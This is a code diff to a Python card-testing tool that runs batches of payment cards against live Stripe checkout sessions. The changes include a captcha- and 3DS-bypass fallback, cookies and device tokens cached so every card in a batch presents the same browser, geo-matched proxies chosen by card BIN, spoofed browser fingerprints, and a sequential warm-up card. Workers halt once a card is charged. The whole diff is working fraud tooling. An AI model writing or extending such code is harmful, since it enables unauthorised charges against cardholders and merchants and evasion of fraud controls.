@@ -787,7 +787,7 @@ class StripeAPIHitter:
             await asyncio.sleep(0.5)
         return None
 
-    async def hit(self, card: Dict, attempt: int, user_id: int, cached_stripe_tokens: dict = None) -> Dict:
+    async def hit(self, card: Dict, attempt: int, user_id: int, cached_stripe_tokens: dict = None, cached_cookies: dict = None) -> Dict:
         start = time.time()
         result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': None, 'merchant': None, 'proxy_raw': None, 'error': None, 'raw_response': None}
         
@@ -847,31 +847,36 @@ class StripeAPIHitter:
                 if proxies:
                     _cffi_session.proxies = proxies
 
+                if cached_cookies:
+                    for ck_name, ck_val in cached_cookies.items():
+                        _cffi_session.cookies.set(ck_name, ck_val)
+
                 # Step 0.1: Browser Session Warm-Up
                 # Get the initial checkout page to populate cookie jar with __stripe_mid and other cookies.
                 # All subsequent requests (telemetry, pre-flights, tokenization) must flow through this same session.
                 rqdata_token = None
-                try:
-                    warmup_headers = {
-                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                        "accept-language": "en-US,en;q=0.9",
-                        "accept-encoding": "gzip, deflate, br",
-                        "sec-fetch-dest": "document",
-                        "sec-fetch-mode": "navigate",
-                        "sec-fetch-site": "none",
-                        "sec-fetch-user": "?1",
-                        "upgrade-insecure-requests": "1",
-                        "user-agent": profile["user_agent"],
-                        "cache-control": "max-age=0"
-                    }
-                    if "sec-ch-ua" in profile: warmup_headers["sec-ch-ua"] = profile["sec-ch-ua"]
-                    if "sec-ch-ua-mobile" in profile: warmup_headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
-                    if "sec-ch-ua-platform" in profile: warmup_headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]
+                if not cached_cookies:
+                    try:
+                        warmup_headers = {
+                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                            "accept-language": "en-US,en;q=0.9",
+                            "accept-encoding": "gzip, deflate, br",
+                            "sec-fetch-dest": "document",
+                            "sec-fetch-mode": "navigate",
+                            "sec-fetch-site": "none",
+                            "sec-fetch-user": "?1",
+                            "upgrade-insecure-requests": "1",
+                            "user-agent": profile["user_agent"],
+                            "cache-control": "max-age=0"
+                        }
+                        if "sec-ch-ua" in profile: warmup_headers["sec-ch-ua"] = profile["sec-ch-ua"]
+                        if "sec-ch-ua-mobile" in profile: warmup_headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
+                        if "sec-ch-ua-platform" in profile: warmup_headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]
 
-                    warmup_res = await loop.run_in_executor(None, lambda: _cffi_session.get(
-                        checkout_page_url, headers=warmup_headers, timeout=15))
-                except Exception:
-                    pass  # warmup failure is non-fatal — continue
+                        warmup_res = await loop.run_in_executor(None, lambda: _cffi_session.get(
+                            checkout_page_url, headers=warmup_headers, timeout=15))
+                    except Exception:
+                        pass  # warmup failure is non-fatal — continue
 
                 # Stripe device fingerprint tokens (muid/sid/guid)
                 # Reuse cached session tokens if available — mimics __stripe_mid (1yr) + __stripe_sid (30min)
@@ -1245,43 +1250,6 @@ class StripeAPIHitter:
                                     or next_action.get("source")
                                 )
 
-                                # === CAPTCHA SOLVER HOOK (Hitchk) ===
-                                if (captcha_triggered or (isinstance(sdk.get('stripe_js'), dict) and 'rqdata' in sdk.get('stripe_js', {}))) and sdk.get('type') == 'intent_confirmation_challenge':
-                                    if _HAS_3DS_BYPASS:
-                                        try:
-                                            _cap_type = "setup_intent" if is_setup_intent else "payment_intent"
-                                            _cap_result = await attempt_captcha_verification(
-                                                loop, _cffi_session, self.pk_live,
-                                                client_secret, intent_id, _cap_type, sdk, headers, pm_id
-                                            )
-                                            if _cap_result:
-                                                _cs, _cm = _cap_result
-                                                if _cs in ('charged', 'approved'):
-                                                    result['success'] = True
-                                                    result['decline_code'] = _cm
-                                                    return result
-                                                elif _cs in ('declined', 'live_declined'):
-                                                    result['decline_code'] = _cm
-                                                    result['error'] = _cm
-                                                    result['raw_response'] = confirm_json
-                                                    return result
-                                                elif _cs == 'requires_action':
-                                                    # Captcha solved, but requires 3DS next!
-                                                    # Update variables in-place so standard 3DS runs next
-                                                    confirm_json = _cm
-                                                    res = confirm_json.get('payment_intent') or confirm_json.get('setup_intent') or confirm_json
-                                                    if not isinstance(res, dict): res = confirm_json
-                                                    next_action = res.get("next_action", {}) or {}
-                                                    sdk = next_action.get("use_stripe_sdk", {}) or {}
-                                                    source = (
-                                                        sdk.get("three_d_secure_2_source")
-                                                        or sdk.get("source")
-                                                        or next_action.get("source")
-                                                    )
-                                                    captcha_triggered = False
-                                        except Exception as _cap_ex:
-                                            print(f"DEBUG: Captcha solver failed: {_cap_ex}")
-
                                 # If CAPTCHA triggered and no source found, retry confirm for fresh 3DS path
                                 if captcha_triggered and not source:
                                     try:
@@ -1298,7 +1266,7 @@ class StripeAPIHitter:
                                                 "payment_method": pm_id,
                                                 "expected_payment_method_type": "card",
                                                 "use_stripe_sdk": "true",
-                                                "payment_method_options[card][request_three_d_secure]": "any",
+                                                "payment_method_options[card][request_three_d_secure]": "automatic",
                                                 "consent[terms_of_service]": "accepted",
                                                 "key": self.pk_live,
                                             }
@@ -1337,7 +1305,6 @@ class StripeAPIHitter:
                                                 sdk = next_action.get('use_stripe_sdk', {}) or {}
                                     except Exception as reconfirm_ex:
                                         print(f"DEBUG: reconfirm retry failed: {reconfirm_ex}")
-                                state = None
 
                                 is_legacy_3ds = (
                                     res.get("status") == "requires_source_action"
@@ -1346,62 +1313,168 @@ class StripeAPIHitter:
                                     or bool(res.get("url"))
                                 )
                                 processed_auth = False
+                                state = None
 
-                                if is_legacy_3ds:
-                                    redirect_url = res.get("url") or sdk.get("stripe_js") or next_action.get("redirect_to_url", {}).get("url")
-                                    if isinstance(redirect_url, str):
-                                        redir_headers = {
-                                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                                if is_legacy_3ds or source:
+                                    if is_legacy_3ds:
+                                        redirect_url = res.get("url") or sdk.get("stripe_js") or next_action.get("redirect_to_url", {}).get("url")
+                                        if isinstance(redirect_url, str):
+                                            redir_headers = {
+                                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                                                "user-agent": profile["user_agent"]
+                                            }
+                                            await loop.run_in_executor(None, lambda: _cffi_session.get(redirect_url, headers=redir_headers, timeout=15))
+                                        await asyncio.sleep(2)
+                                        state = "redirected"
+                                        processed_auth = True
+                                    elif source:
+                                        # authenticate must match the confirm UA — mismatched UA/dimensions trigger challenge
+                                        auth_headers = {
+                                            "accept": "application/json",
+                                            "content-type": "application/x-www-form-urlencoded",
+                                            "origin": "https://js.stripe.com",
+                                            "referer": "https://js.stripe.com/",
                                             "user-agent": profile["user_agent"]
                                         }
-                                        await loop.run_in_executor(None, lambda: _cffi_session.get(redirect_url, headers=redir_headers, timeout=15))
-                                    await asyncio.sleep(2)
-                                    state = "redirected"
-                                    processed_auth = True
-                                elif source:
-                                    # authenticate must match the confirm UA — mismatched UA/dimensions trigger challenge
-                                    auth_headers = {
-                                        "accept": "application/json",
-                                        "content-type": "application/x-www-form-urlencoded",
-                                        "origin": "https://js.stripe.com",
-                                        "referer": "https://js.stripe.com/",
-                                        "user-agent": profile["user_agent"]
-                                    }
-                                    browser = {
-                                        "fingerprintAttempted": True,
-                                        "fingerprintData": None,
-                                        "challengeWindowSize": None,
-                                        "threeDSCompInd": "Y",
-                                        "browserJavaEnabled": False,
-                                        "browserJavascriptEnabled": True,
-                                        "browserLanguage": "en-US",
-                                        "browserColorDepth": profile.get("color_depth", "24"),
-                                        "browserScreenHeight": profile.get("screen_height", "1080"),
-                                        "browserScreenWidth": profile.get("screen_width", "1920"),
-                                        "browserTZ": str(random.randint(-480, 540)),
-                                        "browserUserAgent": profile["user_agent"]
-                                    }
-                                    auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
-                                    auth_data = {
-                                        "source": source,
-                                        "browser": json.dumps(browser),
-                                        "one_click_authn_device_support[hosted]": "false",
-                                        "one_click_authn_device_support[same_origin_frame]": "false",
-                                        "one_click_authn_device_support[spc_eligible]": "false",
-                                        "one_click_authn_device_support[webauthn_eligible]": "false",
-                                        "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
-                                        "key": pk
-                                    }
-                                    auth_resp_raw = await loop.run_in_executor(None, lambda: _cffi_session.post(
-                                        auth_url, headers=auth_headers, data=auth_data, timeout=30))
-                                    auth_json = {}
-                                    try:
-                                        auth_json = auth_resp_raw.json()
-                                        state = auth_json.get("state")
-                                    except Exception:
-                                        state = "3DS Attempt failed"
-                                    processed_auth = True
-                                else:
+                                        browser = {
+                                            "fingerprintAttempted": True,
+                                            "fingerprintData": None,
+                                            "challengeWindowSize": None,
+                                            "threeDSCompInd": "Y",
+                                            "browserJavaEnabled": False,
+                                            "browserJavascriptEnabled": True,
+                                            "browserLanguage": "en-US",
+                                            "browserColorDepth": profile.get("color_depth", "24"),
+                                            "browserScreenHeight": profile.get("screen_height", "1080"),
+                                            "browserScreenWidth": profile.get("screen_width", "1920"),
+                                            "browserTZ": str(random.randint(-480, 540)),
+                                            "browserUserAgent": profile["user_agent"]
+                                        }
+                                        auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
+                                        auth_data = {
+                                            "source": source,
+                                            "browser": json.dumps(browser),
+                                            "one_click_authn_device_support[hosted]": "false",
+                                            "one_click_authn_device_support[same_origin_frame]": "false",
+                                            "one_click_authn_device_support[spc_eligible]": "false",
+                                            "one_click_authn_device_support[webauthn_eligible]": "false",
+                                            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
+                                            "key": pk
+                                        }
+                                        auth_resp_raw = await loop.run_in_executor(None, lambda: _cffi_session.post(
+                                            auth_url, headers=auth_headers, data=auth_data, timeout=30))
+                                        auth_json = {}
+                                        try:
+                                            auth_json = auth_resp_raw.json()
+                                            state = auth_json.get("state")
+                                        except Exception:
+                                            state = "3DS Attempt failed"
+                                        processed_auth = True
+
+                                # Fallback: Run CAPTCHA solver if not authenticated or if challenge/failed states occur
+                                run_captcha_fallback = False
+                                if not processed_auth:
+                                    if captcha_triggered or (isinstance(sdk.get('stripe_js'), dict) and 'rqdata' in sdk.get('stripe_js', {})):
+                                        run_captcha_fallback = True
+                                elif state in ("challenge_required", "3DS Attempt failed", None) and (captcha_triggered or (isinstance(sdk.get('stripe_js'), dict) and 'rqdata' in sdk.get('stripe_js', {}))):
+                                    run_captcha_fallback = True
+
+                                if run_captcha_fallback:
+                                    if _HAS_3DS_BYPASS:
+                                        try:
+                                            _cap_type = "setup_intent" if is_setup_intent else "payment_intent"
+                                            _cap_result = await attempt_captcha_verification(
+                                                loop, _cffi_session, self.pk_live,
+                                                client_secret, intent_id, _cap_type, sdk, headers, pm_id
+                                            )
+                                            if _cap_result:
+                                                _cs, _cm = _cap_result
+                                                if _cs in ('charged', 'approved'):
+                                                    result['success'] = True
+                                                    result['decline_code'] = _cm
+                                                    return result
+                                                elif _cs in ('declined', 'live_declined'):
+                                                    result['decline_code'] = _cm
+                                                    result['error'] = _cm
+                                                    result['raw_response'] = confirm_json
+                                                    return result
+                                                elif _cs == 'requires_action':
+                                                    # Captcha solved, now let's apply the friend's flow to the new state
+                                                    confirm_json = _cm
+                                                    res = confirm_json.get('payment_intent') or confirm_json.get('setup_intent') or confirm_json
+                                                    if not isinstance(res, dict): res = confirm_json
+                                                    next_action = res.get("next_action", {}) or {}
+                                                    sdk = next_action.get("use_stripe_sdk", {}) or {}
+                                                    source = (
+                                                        sdk.get("three_d_secure_2_source")
+                                                        or sdk.get("source")
+                                                        or next_action.get("source")
+                                                    )
+                                                    captcha_triggered = False
+
+                                                    is_legacy_3ds = (
+                                                        res.get("status") == "requires_source_action"
+                                                        or sdk.get("type") == "three_d_secure_redirect"
+                                                        or next_action.get("type") == "redirect_to_url"
+                                                        or bool(res.get("url"))
+                                                    )
+                                                    if is_legacy_3ds:
+                                                        redirect_url = res.get("url") or sdk.get("stripe_js") or next_action.get("redirect_to_url", {}).get("url")
+                                                        if isinstance(redirect_url, str):
+                                                            redir_headers = {
+                                                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                                                                "user-agent": profile["user_agent"]
+                                                            }
+                                                            await loop.run_in_executor(None, lambda: _cffi_session.get(redirect_url, headers=redir_headers, timeout=15))
+                                                        await asyncio.sleep(2)
+                                                        state = "redirected"
+                                                        processed_auth = True
+                                                    elif source:
+                                                        auth_headers = {
+                                                            "accept": "application/json",
+                                                            "content-type": "application/x-www-form-urlencoded",
+                                                            "origin": "https://js.stripe.com",
+                                                            "referer": "https://js.stripe.com/",
+                                                            "user-agent": profile["user_agent"]
+                                                        }
+                                                        browser = {
+                                                            "fingerprintAttempted": True,
+                                                            "fingerprintData": None,
+                                                            "challengeWindowSize": None,
+                                                            "threeDSCompInd": "Y",
+                                                            "browserJavaEnabled": False,
+                                                            "browserJavascriptEnabled": True,
+                                                            "browserLanguage": "en-US",
+                                                            "browserColorDepth": profile.get("color_depth", "24"),
+                                                            "browserScreenHeight": profile.get("screen_height", "1080"),
+                                                            "browserScreenWidth": profile.get("screen_width", "1920"),
+                                                            "browserTZ": str(random.randint(-480, 540)),
+                                                            "browserUserAgent": profile["user_agent"]
+                                                        }
+                                                        auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
+                                                        auth_data = {
+                                                            "source": source,
+                                                            "browser": json.dumps(browser),
+                                                            "one_click_authn_device_support[hosted]": "false",
+                                                            "one_click_authn_device_support[same_origin_frame]": "false",
+                                                            "one_click_authn_device_support[spc_eligible]": "false",
+                                                            "one_click_authn_device_support[webauthn_eligible]": "false",
+                                                            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
+                                                            "key": pk
+                                                        }
+                                                        auth_resp_raw = await loop.run_in_executor(None, lambda: _cffi_session.post(
+                                                            auth_url, headers=auth_headers, data=auth_data, timeout=30))
+                                                        auth_json = {}
+                                                        try:
+                                                            auth_json = auth_resp_raw.json()
+                                                            state = auth_json.get("state")
+                                                        except Exception:
+                                                            state = "3DS Attempt failed"
+                                                        processed_auth = True
+                                        except Exception as _cap_ex:
+                                            print(f"DEBUG: Captcha solver fallback failed: {_cap_ex}")
+
+                                if not processed_auth:
                                     if captcha_triggered or (isinstance(sdk.get('stripe_js'), dict) and 'rqdata' in sdk.get('stripe_js', {})):
                                         result['decline_code'] = 'stripe_captcha_bypass_failed'
                                         result['error'] = 'Stripe CAPTCHA (rqdata) triggered and bypass could not resolve it. Try cleaner proxies.'
@@ -1584,6 +1657,10 @@ class StripeAPIHitter:
             finally:
                 if _cffi_session:
                     try:
+                        result['_session_cookies'] = dict(_cffi_session.cookies)
+                    except Exception:
+                        pass
+                    try:
                         _cffi_session.close()
                     except Exception:
                         pass
@@ -1613,6 +1690,7 @@ class ConcurrentHitter:
         self._stripe_tokens: dict = {}
         self._stripe_tokens_ts: float = 0.0
         self._stripe_profile: dict = None
+        self._session_cookies: dict = {}
         
     async def _fetch_fresh_session(self) -> dict:
         """Re-fetch the reusable URL to mint a fresh cs_live + pk_live pair.
@@ -1771,6 +1849,138 @@ class ConcurrentHitter:
             await self.update_callback({"status": "error", "error": "Failed to analyze Stripe endpoint. Proxies might be dead."})
         return False
 
+    async def _process_single_card(self, card: dict, attempt_num: int, queue: asyncio.Queue):
+        max_retries = 2
+        bin_info = await BINLookup.lookup(card['card'])
+        bin_country = bin_info.get('country', '')
+        for try_idx in range(max_retries):
+            # --- Fresh session per card for reusable links ---
+            cs_token = self.url_info['cs_token']
+            pk_key = self.url_info['pk_key']
+            raw_amount = self.url_info.get('raw_amount')
+            locked_email = self.url_info.get('locked_email')
+            
+            if self._reusable:
+                async with self._session_lock:
+                    fresh = await self._fetch_fresh_session()
+                if fresh:
+                    cs_token = fresh['cs_token']
+                    pk_key = fresh['pk_key']
+                    # Re-fetch payment data for the fresh session to get correct amount
+                    try:
+                        api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key)
+                        if api_data.get('success'):
+                            raw_amount = api_data.get('raw_amount') or raw_amount
+                            locked_email = api_data.get('locked_email') or locked_email
+                    except Exception:
+                        pass
+            
+            if not self._stripe_profile:
+                self._stripe_profile = random.choice(BROWSER_PROFILES)
+            proxy_data = await ProxyManager.get_geo_matched(self.user_id, bin_country) if bin_country else await ProxyManager.get_random(self.user_id)
+            hitter = StripeAPIHitter(pk_key, cs_token, proxy_data, raw_amount, locked_email, profile=self._stripe_profile)
+            await asyncio.sleep(random.uniform(0.05, 0.2))  # Micro-random delay per card attempt  
+            
+            # Reuse session-level stripe tokens — all cards in the batch should carry the same
+            # muid/sid/guid to mimic a real browser's __stripe_mid (1yr) and __stripe_sid (30min)
+            # Refresh tokens only when older than 25 minutes (inside the 30-min sid window)
+            token_age = time.time() - self._stripe_tokens_ts
+            if not self._stripe_tokens or token_age > 1500:  # 1500s = 25 minutes
+                # No cached tokens yet — hit() will generate them fresh on first card
+                session_tokens = None
+            else:
+                session_tokens = self._stripe_tokens
+            
+            session_cookies = self._session_cookies
+            
+            result = await hitter.hit(card, attempt_num, self.user_id, cached_stripe_tokens=session_tokens, cached_cookies=session_cookies)
+            
+            # Cache the tokens and cookies returned from first card hit for reuse by all subsequent cards
+            if not session_tokens and isinstance(result, dict) and result.get('_stripe_tokens'):
+                self._stripe_tokens = result['_stripe_tokens']
+                self._stripe_tokens_ts = time.time()
+            if not session_cookies and isinstance(result, dict) and result.get('_session_cookies'):
+                self._session_cookies = result['_session_cookies']
+                
+            if isinstance(result, dict) and "status" in result and "result" in result:
+                friend_res = result
+                result = {
+                    'attempt': attempt_num,
+                    'card': card,
+                    'success': friend_res.get("status", False),
+                    'decline_code': friend_res.get("result", {}).get("status"),
+                    'response_time': friend_res.get("result", {}).get("time", 0),
+                    'amount': self.url_info.get('amount'),
+                    'merchant': self.url_info.get('merchant'),
+                    'proxy_raw': proxy_data['raw'] if proxy_data else None,
+                    'error': friend_res.get("result", {}).get("message")
+                }
+                if 'final_url' in friend_res:
+                    result['final_url'] = friend_res['final_url']
+                elif 'final_url' in friend_res.get('result', {}):
+                    result['final_url'] = friend_res['result']['final_url']
+                if 'receipt_url' in friend_res:
+                    result['receipt_url'] = friend_res['receipt_url']
+                elif 'receipt_url' in friend_res.get('result', {}):
+                    result['receipt_url'] = friend_res['result']['receipt_url']
+            result['amount'] = self.url_info.get('amount')
+            result['merchant'] = self.url_info.get('merchant')
+            
+            err_str = result.get('error', '') or ''
+            decline = result.get('decline_code', '') or ''
+            should_retry = False
+            
+            # Retry on network failures
+            if decline == 'exception':
+                if any(k in err_str for k in ['Timeout', 'ERR_', 'closed', 'refused', 'reset', 'disconnected', 'socket', 'Navigation failed']):
+                    should_retry = True
+            
+            # Retry on resource_missing — session was stale, fetch a new one
+            if decline == 'resource_missing' and self._reusable:
+                should_retry = True
+                    
+            if should_retry:
+                if try_idx < max_retries - 1:
+                    delay = 2.0 * (try_idx + 1)
+                    await asyncio.sleep(delay)
+                    continue
+            break
+        
+        # Race-condition guard: if another worker succeeded while we were hitting, discard this failure result.
+        if not self.is_running and not result.get('success'):
+            return
+        
+        async with self._counter_lock:
+            self.completed += 1
+            if result['success']:
+                self.successes += 1
+                self.is_running = False
+            else:
+                self.fails += 1
+        
+        if result['success']:
+            # Cancel all other workers immediately to stop them
+            current_task = asyncio.current_task()
+            for w in getattr(self, 'workers', []):
+                if w != current_task and not w.done():
+                    w.cancel()
+                    
+            while not queue.empty():
+                try:
+                    queue.get_nowait()
+                except asyncio.QueueEmpty:
+                    break
+            
+        if self.update_callback:
+            await self.update_callback({
+                "status": "progress",
+                "result": result,
+                "completed": self.completed,
+                "total": self.total,
+                "successes": self.successes,
+                "fails": self.fails
+            })
+
     async def _worker(self, queue: asyncio.Queue):
         while self.is_running:
             try:
@@ -1779,131 +1989,7 @@ class ConcurrentHitter:
                 break
                 
             try:
-                max_retries = 2
-                bin_info = await BINLookup.lookup(card['card'])
-                bin_country = bin_info.get('country', '')
-                for try_idx in range(max_retries):
-                    # --- Fresh session per card for reusable links ---
-                    cs_token = self.url_info['cs_token']
-                    pk_key = self.url_info['pk_key']
-                    raw_amount = self.url_info.get('raw_amount')
-                    locked_email = self.url_info.get('locked_email')
-                    
-                    if self._reusable:
-                        async with self._session_lock:
-                            fresh = await self._fetch_fresh_session()
-                        if fresh:
-                            cs_token = fresh['cs_token']
-                            pk_key = fresh['pk_key']
-                            # Re-fetch payment data for the fresh session to get correct amount
-                            try:
-                                api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key)
-                                if api_data.get('success'):
-                                    raw_amount = api_data.get('raw_amount') or raw_amount
-                                    locked_email = api_data.get('locked_email') or locked_email
-                            except Exception:
-                                pass
-                    
-                    if not self._stripe_profile:
-                        self._stripe_profile = random.choice(BROWSER_PROFILES)
-                    proxy_data = await ProxyManager.get_geo_matched(self.user_id, bin_country) if bin_country else await ProxyManager.get_random(self.user_id)
-                    hitter = StripeAPIHitter(pk_key, cs_token, proxy_data, raw_amount, locked_email, profile=self._stripe_profile)
-                    await asyncio.sleep(random.uniform(0.05, 0.2))  # Micro-random delay per card attempt  
-                    
-                    # Reuse session-level stripe tokens — all cards in the batch should carry the same
-                    # muid/sid/guid to mimic a real browser's __stripe_mid (1yr) and __stripe_sid (30min)
-                    # Refresh tokens only when older than 25 minutes (inside the 30-min sid window)
-                    token_age = time.time() - self._stripe_tokens_ts
-                    if not self._stripe_tokens or token_age > 1500:  # 1500s = 25 minutes
-                        # No cached tokens yet — hit() will generate them fresh on first card
-                        session_tokens = None
-                    else:
-                        session_tokens = self._stripe_tokens
-                    
-                    result = await hitter.hit(card, attempt_num, self.user_id, cached_stripe_tokens=session_tokens)
-                    
-                    # Cache the tokens returned from first card hit for reuse by all subsequent cards
-                    if not session_tokens and isinstance(result, dict) and result.get('_stripe_tokens'):
-                        self._stripe_tokens = result['_stripe_tokens']
-                        self._stripe_tokens_ts = time.time()
-                    if isinstance(result, dict) and "status" in result and "result" in result:
-                        friend_res = result
-                        result = {
-                            'attempt': attempt_num,
-                            'card': card,
-                            'success': friend_res.get("status", False),
-                            'decline_code': friend_res.get("result", {}).get("status"),
-                            'response_time': friend_res.get("result", {}).get("time", 0),
-                            'amount': self.url_info.get('amount'),
-                            'merchant': self.url_info.get('merchant'),
-                            'proxy_raw': proxy_data['raw'] if proxy_data else None,
-                            'error': friend_res.get("result", {}).get("message")
-                        }
-                        if 'final_url' in friend_res:
-                            result['final_url'] = friend_res['final_url']
-                        elif 'final_url' in friend_res.get('result', {}):
-                            result['final_url'] = friend_res['result']['final_url']
-                        if 'receipt_url' in friend_res:
-                            result['receipt_url'] = friend_res['receipt_url']
-                        elif 'receipt_url' in friend_res.get('result', {}):
-                            result['receipt_url'] = friend_res['result']['receipt_url']
-                    result['amount'] = self.url_info.get('amount')
-                    result['merchant'] = self.url_info.get('merchant')
-                    
-                    err_str = result.get('error', '') or ''
-                    decline = result.get('decline_code', '') or ''
-                    should_retry = False
-                    
-                    # Retry on network failures
-                    if decline == 'exception':
-                        if any(k in err_str for k in ['Timeout', 'ERR_', 'closed', 'refused', 'reset', 'disconnected', 'socket', 'Navigation failed']):
-                            should_retry = True
-                    
-                    # Retry on resource_missing — session was stale, fetch a new one
-                    if decline == 'resource_missing' and self._reusable:
-                        should_retry = True
-                            
-                    if should_retry:
-                        if try_idx < max_retries - 1:
-                            delay = 2.0 * (try_idx + 1)
-                            await asyncio.sleep(delay)
-                            continue
-                    break
-                
-                # Race-condition guard: if another worker succeeded while we were hitting, discard this failure result.
-                if not self.is_running and not result.get('success'):
-                    return
-                
-                async with self._counter_lock:
-                    self.completed += 1
-                    if result['success']:
-                        self.successes += 1
-                        self.is_running = False
-                    else:
-                        self.fails += 1
-                
-                if result['success']:
-                    # Cancel all other workers immediately to stop them
-                    current_task = asyncio.current_task()
-                    for w in getattr(self, 'workers', []):
-                        if w != current_task and not w.done():
-                            w.cancel()
-                            
-                    while not queue.empty():
-                        try:
-                            queue.get_nowait()
-                        except asyncio.QueueEmpty:
-                            break
-                    
-                if self.update_callback:
-                    await self.update_callback({
-                        "status": "progress",
-                        "result": result,
-                        "completed": self.completed,
-                        "total": self.total,
-                        "successes": self.successes,
-                        "fails": self.fails
-                    })
+                await self._process_single_card(card, attempt_num, queue)
             except asyncio.CancelledError:
                 # Worker was cancelled. Clean exit.
                 return
@@ -1948,7 +2034,21 @@ class ConcurrentHitter:
             queue.put_nowait((card, idx+1))
             
         self.workers = []
-        for _ in range(min(CONCURRENT_BATCH_SIZE, len(self.cards))):
+
+        # 1. Pop and run the first card sequentially to initialize/warmup cookies and tokens
+        if not queue.empty():
+            first_card, first_attempt = queue.get_nowait()
+            try:
+                await self._process_single_card(first_card, first_attempt, queue)
+            except Exception as e:
+                import traceback
+                print(f"DEBUG: Sequential first card failed: {e}\n{traceback.format_exc()}")
+            finally:
+                queue.task_done()
+            
+        # 2. Run the remaining cards in parallel
+        # Note: if first card succeeded and self.is_running was set to False, workers will exit immediately
+        for _ in range(min(CONCURRENT_BATCH_SIZE, len(self.cards) - 1 if not queue.empty() else len(self.cards))):
             task = asyncio.create_task(self._worker(queue))
             self.workers.append(task)
             
